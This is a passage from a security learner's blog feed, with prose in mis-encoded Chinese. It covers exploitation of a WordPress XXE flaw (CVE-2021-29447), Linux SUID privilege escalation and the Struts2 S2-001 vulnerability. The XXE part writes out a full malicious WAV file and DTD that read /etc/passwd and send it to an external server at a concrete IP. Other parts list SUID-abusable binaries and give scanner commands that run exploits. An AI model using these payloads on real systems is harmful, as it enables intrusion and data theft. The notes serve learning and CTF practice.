æ·±äº†æˆ‘å¯¹xxeçš„ä¸€äº›åŸºç¡€çŸ¥è¯†çš„ç†è§£ï¼ŒçŸ¥é“äº†xxeå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œå¹¶ä¸”å¦‚ä½•è¿›è¡Œä¿®å¤ã€‚å¯¹äºxmlå’Œdtdçš„åŸºç¡€çŸ¥è¯†ä¹Ÿæœ‰äº†ä¸€å®šçš„äº†è§£ï¼Œèƒ½å¤Ÿè¿›è¡Œä¸€å®šç¨‹åº¦ä¸Šçš„è¿ç”¨ã€‚å­¦ä¹ åˆ°äº†åœ¨xxeå®ä½“æ³¨å…¥æ—¶ï¼Œæ²¡æœ‰å›æ˜¾å¯ä»¥ä½¿ç”¨vpså°†ssrfå¾—åˆ°ä¿¡æ¯å¤–å¸¦å‡ºæ¥ã€‚æœ€åï¼Œè¿˜æœ‰å†æ¬¡å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨dockeræ­å»ºç¯å¢ƒï¼Œç¡®å®ååˆ†æ–¹ä¾¿ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="http://cn-sec.com/archives/362965.html">http://cn-sec.com/archives/362965.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/368864884">https://zhuanlan.zhihu.com/p/368864884</a></p><p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a></p><p><a href="https://www.freebuf.com/vuls/272446.html">https://www.freebuf.com/vuls/272446.html</a></p><p><a href="https://dl.packetstormsecurity.net/2106-exploits/CVE-2021-29447.pdf">https://dl.packetstormsecurity.net/2106-exploits/CVE-2021-29447.pdf</a></p><h2 id="PAYLOAD-amp-ä¸€äº›é¢å¤–çŸ¥è¯†"><a href="#PAYLOAD-amp-ä¸€äº›é¢å¤–çŸ¥è¯†" class="headerlink" title="PAYLOAD&amp;ä¸€äº›é¢å¤–çŸ¥è¯†"></a>PAYLOAD&amp;ä¸€äº›é¢å¤–çŸ¥è¯†</h2><p>ä¸‹é¢ä½¿ç”¨çš„éƒ½æ˜¯å‚æ•°å®ä½“</p><p>Now we can create a malicious WAV file.</p><pre class="line-numbers language-none"><code class="language-none">echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;[Our IP]:[PORT]&#x2F;[FILE].dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; 123.wavecho -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wavRIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;evil.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Now create an evil.dtd file to store the next part of the payload</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;?p&#x3D;%file;&#39;&gt;&quot; &gt;&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;?p&#x3D;%file;&#39;&gt;&quot; &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€»çš„payloadä¸º:</p><p>å‰é¢çš„å‡ ä¸ªç‰¹å®šå­—ç¬¦ä¸ºæ„é€ waveæ–‡ä»¶çš„å¿…è¦ç»“æ„</p><pre class="line-numbers language-none"><code class="language-none">RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;evil.dtd&#39;&gt;%remote;%init;%trick;]&gt;\x00&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.default&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY %init &quot;&lt;!ENTITY % trick SYSTEM &#39;http:&#x2F;&#x2F;VPS:PORT&#x2F;?p&#x3D;%file&#39;&quot;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç”±äºè¯·æ±‚æ—¶ï¼Œå°†æ•°æ®base64åŠ å¯†äº†ä¸€éåˆå‹ç¼©äº†ä¸€éï¼Œæ‰€ä»¥éœ€è¦å…ˆbase64è§£å¯†åè§£å‹</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho zlib_decode(base64_decode(&#39;&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><pre class="line-numbers language-none"><code class="language-none">docker-compose up -ddocker-compose downdocker psdocker imagesdocker exec -it (container-id) &#x2F;bin&#x2F;bashdocker rmi (images-id)ç¼–è¾‘dockerå†…çš„æ–‡ä»¶å¯ä»¥ç›´æ¥ cat&gt;&gt;å°±è¡Œäº†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="wordpressç¦ç”¨æ›´æ–°"><a href="#wordpressç¦ç”¨æ›´æ–°" class="headerlink" title="wordpressç¦ç”¨æ›´æ–°"></a>wordpressç¦ç”¨æ›´æ–°</h4><pre class="line-numbers language-none"><code class="language-none">define( &#39;WP_AUTO_UPDATE_CORE&#39;, false ); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¸‹SUIDææƒ</title>
      <link href="/2022/05/01/linux-xia-suid-ti-quan/"/>
      <url>/2022/05/01/linux-xia-suid-ti-quan/</url>
      
        <content type="html"><![CDATA[<h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;baijiahao.baidu.com&#x2F;s?id&#x3D;1727594857858909253&amp;wfr&#x3D;spider&amp;for&#x3D;pchttps:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;article&#x2F;details&#x2F;84872644http:&#x2F;&#x2F;www.hackdig.com&#x2F;05&#x2F;hack-351745.htm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ä»€ä¹ˆæ˜¯SUID"><a href="#ä»€ä¹ˆæ˜¯SUID" class="headerlink" title="ä»€ä¹ˆæ˜¯SUID"></a>ä»€ä¹ˆæ˜¯SUID</h3><p>SUID (Set  UID)æ˜¯Linuxä¸­çš„ä¸€ç§ç‰¹æ®Šæƒé™,å…¶åŠŸèƒ½ä¸ºç”¨æˆ·è¿è¡ŒæŸä¸ªç¨‹åºæ—¶ï¼Œå¦‚æœè¯¥ç¨‹åºæœ‰SUIDæƒé™ï¼Œé‚£ä¹ˆç¨‹åºè¿è¡Œä¸ºè¿›ç¨‹æ—¶ï¼Œè¿›ç¨‹çš„å±ä¸»ä¸æ˜¯å‘èµ·è€…ï¼Œè€Œæ˜¯ç¨‹åºæ–‡ä»¶æ‰€å±çš„å±ä¸»ã€‚ä½†æ˜¯SUIDæƒé™çš„è®¾ç½®åªé’ˆå¯¹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,å¯¹äºéå¯æ‰§è¡Œæ–‡ä»¶è®¾ç½®SUIDæ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚</p><p>åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨è€…ä¼šæš‚æ—¶è·å¾—è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…æƒé™,ä¸”è¯¥æƒé™åªåœ¨ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ.  é€šä¿—çš„æ¥è®²,å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ls,å…¶å±ä¸»ä¸ºroot,å½“æˆ‘ä»¬é€šè¿‡érootç”¨æˆ·ç™»å½•æ—¶,å¦‚æœlsè®¾ç½®äº†SUIDæƒé™,æˆ‘ä»¬å¯åœ¨érootç”¨æˆ·ä¸‹è¿è¡Œè¯¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶,åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶,è¯¥è¿›ç¨‹çš„æƒé™å°†ä¸ºrootæƒé™ã€‚</p><p>åˆ©ç”¨æ­¤ç‰¹æ€§,æˆ‘ä»¬å¯é€šè¿‡SUIDè¿›è¡Œææƒã€‚</p><h3 id="è®¾ç½®SUID"><a href="#è®¾ç½®SUID" class="headerlink" title="è®¾ç½®SUID"></a>è®¾ç½®SUID</h3><p>åœ¨äº†è§£SUIDææƒä»¥å‰ æˆ‘ä»¬ç®€å•çœ‹ä¸€ä¸‹å¦‚ä½•è®¾ç½®SUIDæƒé™</p><pre class="line-numbers language-none"><code class="language-none">chmod u+s filename   è®¾ç½®SUIDä½chmod u-s filename   å»æ‰SUIDè®¾ç½®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="é€šè¿‡rootè®¾ç½®çš„å…·æœ‰SUIDæƒé™çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ææƒ"><a href="#é€šè¿‡rootè®¾ç½®çš„å…·æœ‰SUIDæƒé™çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ææƒ" class="headerlink" title="é€šè¿‡rootè®¾ç½®çš„å…·æœ‰SUIDæƒé™çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ææƒ"></a>é€šè¿‡rootè®¾ç½®çš„å…·æœ‰SUIDæƒé™çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ææƒ</h3><p>å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„linuxå¯è¡Œæ€§çš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š</p><ul><li>nmap</li><li>vim</li><li>find</li><li>bash</li><li>more</li><li>less</li><li>nano</li><li>cp</li><li>awk</li></ul><p>ä»¥ä¸‹å‘½ä»¤å¯ä»¥å‘ç°ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">#ä»¥ä¸‹å‘½ä»¤å°†å°è¯•æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶ï¼Œä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000-print2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000-exec ls -ldb &#123;&#125; \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Structs2æ¼æ´</title>
      <link href="/2022/04/30/structs2-lou-dong/"/>
      <url>/2022/04/30/structs2-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="structs2æ¼æ´æ£€æµ‹å·¥å…·åˆ©ç”¨"><a href="#structs2æ¼æ´æ£€æµ‹å·¥å…·åˆ©ç”¨" class="headerlink" title="structs2æ¼æ´æ£€æµ‹å·¥å…·åˆ©ç”¨"></a>structs2æ¼æ´æ£€æµ‹å·¥å…·åˆ©ç”¨</h3><p>è¿™ä¸ªå·¥å…·ç®€ç›´ç°æœ‰çš„æ´éƒ½é€šæ€ï¼Œç»ç»å­ï¼</p><p>è„šæœ¬é€šæ€ ä¸‹è½½ <code>ä¸‹è½½é“¾æ¥ï¼šhttps://pan.baidu.com/s/19yr0tWbG1UU_ULjEan5ttQ æå–ç ï¼šbn71</code></p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">æ£€æµ‹python Struts2Scan.py -u http:&#x2F;&#x2F;94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show&#x2F;S2-001&#x2F;login.actionåˆ©ç”¨python Struts2Scan.py -u http:&#x2F;&#x2F;94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show&#x2F;S2-001&#x2F;login.action -n S2-001 --exec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="structsçš„s2-001æ¼æ´"><a href="#structsçš„s2-001æ¼æ´" class="headerlink" title="structsçš„s2-001æ¼æ´"></a>structsçš„s2-001æ¼æ´</h3><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;224041.htmlhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;q20010619&#x2F;article&#x2F;details&#x2F;120729447?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522165130574916782390569415%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id&#x3D;165130574916782390569415&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-120729447.142^v9^pc_search_result_cache,157^v4^control&amp;utm_term&#x3D;ctfshow+web279&amp;spm&#x3D;1018.2226.3001.4187<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h4><p>è¯¥æ¼æ´å› ç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼Œåç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨OGNLè¡¨è¾¾å¼<code>%&#123;value&#125;</code>è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚å¦‚æ³¨å†Œæˆ–ç™»å½•é¡µé¢ï¼Œæäº¤å¤±è´¥åä¸€èˆ¬ä¼šé»˜è®¤è¿”å›ä¹‹å‰æäº¤çš„æ•°æ®ï¼Œç”±äºåç«¯ä½¿ç”¨<code>%&#123;value&#125;</code>å¯¹æäº¤çš„æ•°æ®æ‰§è¡Œäº†ä¸€æ¬¡OGNL è¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€  Payloadè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h4 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p><code>Struts 2.0.0 - 2.0.8</code></p><h4 id="OGNLè¡¨è¾¾å¼"><a href="#OGNLè¡¨è¾¾å¼" class="headerlink" title="OGNLè¡¨è¾¾å¼"></a>OGNLè¡¨è¾¾å¼</h4><h5 id="ä¸‰ä¸ªç¬¦å·çš„å«ä¹‰"><a href="#ä¸‰ä¸ªç¬¦å·çš„å«ä¹‰" class="headerlink" title="% # $ä¸‰ä¸ªç¬¦å·çš„å«ä¹‰"></a>% # $ä¸‰ä¸ªç¬¦å·çš„å«ä¹‰</h5><ul><li>%çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè®¡ç®—OGNLè¡¨è¾¾å¼ä¸­<code>%&#123;&#125;</code>ä¸­çš„å€¼</li><li>#çš„ç”¨é€”ä¸»è¦æ˜¯è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå› ä¸º<code>structs2</code>ä¸­çš„å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶ï¼Œéœ€è¦åŠ #å‰ç¼€æ‰èƒ½è°ƒç”¨</li><li>$ä¸»è¦æ˜¯åœ¨structs2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼•ç”¨OGNLè¡¨è¾¾å¼</li></ul><h5 id="å¤§ä½¬æ€»ç»“çš„å¥½ä¸œè¥¿"><a href="#å¤§ä½¬æ€»ç»“çš„å¥½ä¸œè¥¿" class="headerlink" title="å¤§ä½¬æ€»ç»“çš„å¥½ä¸œè¥¿"></a>å¤§ä½¬æ€»ç»“çš„å¥½ä¸œè¥¿</h5><p>OGNL æ˜¯ Object-Graph Navigation Language çš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression  Languageï¼Œç®€ç§°ä¸º  ELï¼‰ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§</p><p> OGNL ä¸‰è¦ç´ ï¼š</p><p>1ã€è¡¨è¾¾å¼ï¼ˆExpressionï¼‰</p><p>è¡¨è¾¾å¼æ˜¯æ•´ä¸ª OGNL çš„æ ¸å¿ƒï¼Œæ‰€æœ‰çš„ OGNL  æ“ä½œéƒ½æ˜¯é’ˆå¯¹è¡¨è¾¾å¼çš„è§£æåè¿›è¡Œçš„ã€‚è¡¨è¾¾å¼ä¼šè§„å®šæ­¤æ¬¡ OGNL  æ“ä½œåˆ°åº•è¦å¹²ä»€ä¹ˆã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¸Šé¢çš„æµ‹è¯•ä¸­ï¼Œnameã€department.name ç­‰éƒ½æ˜¯è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºå– name æˆ–è€…  department ä¸­çš„ name çš„å€¼ã€‚OGNL æ”¯æŒå¾ˆå¤šç±»å‹çš„è¡¨è¾¾å¼ï¼Œä¹‹åæˆ‘ä»¬ä¼šçœ‹åˆ°æ›´å¤šã€‚</p><p>2ã€æ ¹å¯¹è±¡ï¼ˆRoot Objectï¼‰</p><p>æ ¹å¯¹è±¡å¯ä»¥ç†è§£ä¸º OGNL çš„æ“ä½œå¯¹è±¡ã€‚åœ¨è¡¨è¾¾å¼è§„å®šäº† â€œå¹²ä»€ä¹ˆâ€ ä»¥åï¼Œä½ è¿˜éœ€è¦æŒ‡å®šåˆ°åº•â€œå¯¹è°å¹²â€ã€‚åœ¨ä¸Šé¢çš„æµ‹è¯•ä»£ç ä¸­ï¼Œuser  å°±æ˜¯æ ¹å¯¹è±¡ã€‚è¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ user è¿™ä¸ªå¯¹è±¡å»å– name è¿™ä¸ªå±æ€§çš„å€¼ï¼ˆå¯¹ user è¿™ä¸ªå¯¹è±¡å»è®¾ç½®å…¶ä¸­çš„ department  ä¸­çš„ name å±æ€§å€¼ï¼‰ã€‚</p><p>3ã€ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰</p><p>æœ‰äº†è¡¨è¾¾å¼å’Œæ ¹å¯¹è±¡ï¼Œæˆ‘ä»¬å®é™…ä¸Šå·²ç»å¯ä»¥ä½¿ç”¨ OGNL  çš„åŸºæœ¬åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œæ ¹æ®è¡¨è¾¾å¼å¯¹æ ¹å¯¹è±¡è¿›è¡Œå–å€¼æˆ–è€…è®¾å€¼å·¥ä½œã€‚ä¸è¿‡å®é™…ä¸Šï¼Œåœ¨ OGNL çš„å†…éƒ¨ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿™ä¸ªç¯å¢ƒå°±æ˜¯  OGNL çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰ã€‚è¯´å¾—å†æ˜ç™½ä¸€äº›ï¼Œå°±æ˜¯è¿™ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰ï¼Œå°†è§„å®š OGNL çš„æ“ä½œ â€œåœ¨å“ªé‡Œå¹²â€ã€‚<br>OGNL çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯ä¸€ä¸ª Map ç»“æ„ï¼Œç§°ä¹‹ä¸º OgnlContextã€‚ä¸Šé¢æˆ‘ä»¬æåˆ°çš„æ ¹å¯¹è±¡ï¼ˆRoot Objectï¼‰ï¼Œäº‹å®ä¸Šä¹Ÿä¼šè¢«åŠ å…¥åˆ°ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å»ï¼Œå¹¶ä¸”è¿™å°†ä½œä¸ºä¸€ä¸ªç‰¹æ®Šçš„å˜é‡è¿›è¡Œå¤„ç†ï¼Œå…·ä½“å°±è¡¨ç°ä¸ºé’ˆå¯¹æ ¹å¯¹è±¡ï¼ˆRoot Objectï¼‰çš„å­˜å–æ“ä½œçš„è¡¨è¾¾å¼æ˜¯ä¸éœ€è¦å¢åŠ  #ç¬¦å·è¿›è¡ŒåŒºåˆ†çš„ã€‚</p><h4 id="è¡¨è¾¾å¼åŠŸèƒ½æ“ä½œæ¸…å•"><a href="#è¡¨è¾¾å¼åŠŸèƒ½æ“ä½œæ¸…å•" class="headerlink" title="è¡¨è¾¾å¼åŠŸèƒ½æ“ä½œæ¸…å•"></a>è¡¨è¾¾å¼åŠŸèƒ½æ“ä½œæ¸…å•</h4><pre class="line-numbers language-none"><code class="language-none">1. åŸºæœ¬å¯¹è±¡æ ‘çš„è®¿é—®å¯¹è±¡æ ‘çš„è®¿é—®å°±æ˜¯é€šè¿‡ä½¿ç”¨ç‚¹å·å°†å¯¹è±¡çš„å¼•ç”¨ä¸²è”èµ·æ¥è¿›è¡Œã€‚ä¾‹å¦‚ï¼šxxxxï¼Œxxxx.xxxxï¼Œxxxx. xxxx. xxxx. xxxx. xxxx2. å¯¹å®¹å™¨å˜é‡çš„è®¿é—®å¯¹å®¹å™¨å˜é‡çš„è®¿é—®ï¼Œé€šè¿‡#ç¬¦å·åŠ ä¸Šè¡¨è¾¾å¼è¿›è¡Œã€‚ä¾‹å¦‚ï¼š#xxxxï¼Œ#xxxx. xxxxï¼Œ#xxxx.xxxxx. xxxx. xxxx. xxxx3. ä½¿ç”¨æ“ä½œç¬¦å·OGNLè¡¨è¾¾å¼ä¸­èƒ½ä½¿ç”¨çš„æ“ä½œç¬¦åŸºæœ¬è·ŸJavaé‡Œçš„æ“ä½œç¬¦ä¸€æ ·ï¼Œé™¤äº†èƒ½ä½¿ç”¨ +, -, *, &#x2F;, ++, --, &#x3D;&#x3D;, !&#x3D;, &#x3D; ç­‰æ“ä½œç¬¦ä¹‹å¤–ï¼Œè¿˜èƒ½ä½¿ç”¨ mod, in, not inç­‰ã€‚4. å®¹å™¨ã€æ•°ç»„ã€å¯¹è±¡OGNLæ”¯æŒå¯¹æ•°ç»„å’ŒArrayListç­‰å®¹å™¨çš„é¡ºåºè®¿é—®ï¼šä¾‹å¦‚ï¼šgroup.users[0]åŒæ—¶ï¼ŒOGNLæ”¯æŒå¯¹Mapçš„æŒ‰é”®å€¼æŸ¥æ‰¾ï¼šä¾‹å¦‚ï¼š#session[&#39;mySessionPropKey&#39;]ä¸ä»…å¦‚æ­¤ï¼ŒOGNLè¿˜æ”¯æŒå®¹å™¨çš„æ„é€ çš„è¡¨è¾¾å¼ï¼šä¾‹å¦‚ï¼š&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;æ„é€ ä¸€ä¸ªListï¼Œ#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;æ„é€ ä¸€ä¸ªMapä½ ä¹Ÿå¯ä»¥é€šè¿‡ä»»æ„ç±»å¯¹è±¡çš„æ„é€ å‡½æ•°è¿›è¡Œå¯¹è±¡æ–°å»ºä¾‹å¦‚ï¼šnew Java.net.URL(&quot;xxxxxx&#x2F;&quot;)5. å¯¹é™æ€æ–¹æ³•æˆ–å˜é‡çš„è®¿é—®è¦å¼•ç”¨ç±»çš„é™æ€æ–¹æ³•å’Œå­—æ®µï¼Œä»–ä»¬çš„è¡¨è¾¾æ–¹å¼æ˜¯ä¸€æ ·çš„@class@memberæˆ–è€…@class@method(args)ï¼š6. æ–¹æ³•è°ƒç”¨ç›´æ¥é€šè¿‡ç±»ä¼¼Javaçš„æ–¹æ³•è°ƒç”¨æ–¹å¼è¿›è¡Œï¼Œä½ ç”šè‡³å¯ä»¥ä¼ é€’å‚æ•°ï¼šä¾‹å¦‚ï¼šuser.getName()ï¼Œgroup.users.size()ï¼Œgroup.containsUser(#requestUser)7. æŠ•å½±å’Œé€‰æ‹©OGNLæ”¯æŒç±»ä¼¼æ•°æ®åº“ä¸­çš„æŠ•å½±ï¼ˆprojectionï¼‰ å’Œé€‰æ‹©ï¼ˆselectionï¼‰ã€‚æŠ•å½±å°±æ˜¯é€‰å‡º**ä¸­æ¯ä¸ªå…ƒç´ çš„ç›¸åŒå±æ€§ç»„æˆæ–°çš„**ï¼Œç±»ä¼¼äºå…³ç³»æ•°æ®åº“çš„å­—æ®µæ“ä½œã€‚æŠ•å½±æ“ä½œè¯­æ³•ä¸º collection.&#123;XXX&#125;ï¼Œå…¶ä¸­XXX æ˜¯è¿™ä¸ª**ä¸­æ¯ä¸ªå…ƒç´ çš„å…¬å…±å±æ€§ã€‚ä¾‹å¦‚ï¼šgroup.userList.&#123;username&#125;å°†è·å¾—æŸä¸ªgroupä¸­çš„æ‰€æœ‰userçš„nameçš„åˆ—è¡¨ã€‚é€‰æ‹©å°±æ˜¯è¿‡æ»¤æ»¡è¶³selection æ¡ä»¶çš„**å…ƒç´ ï¼Œç±»ä¼¼äºå…³ç³»æ•°æ®åº“çš„çºªå½•æ“ä½œã€‚é€‰æ‹©æ“ä½œçš„è¯­æ³•ä¸ºï¼šcollection.&#123;X YYY&#125;ï¼Œå…¶ä¸­X æ˜¯ä¸€ä¸ªé€‰æ‹©æ“ä½œç¬¦ï¼Œåé¢åˆ™æ˜¯é€‰æ‹©ç”¨çš„é€»è¾‘è¡¨è¾¾å¼ã€‚è€Œé€‰æ‹©æ“ä½œç¬¦æœ‰ä¸‰ç§ï¼š? é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰å…ƒç´ ^ é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€ä¸ªå…ƒç´ $ é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æœ€åä¸€ä¸ªå…ƒç´ ä¾‹å¦‚ï¼šgroup.userList.&#123;? #txxx.xxx !&#x3D; 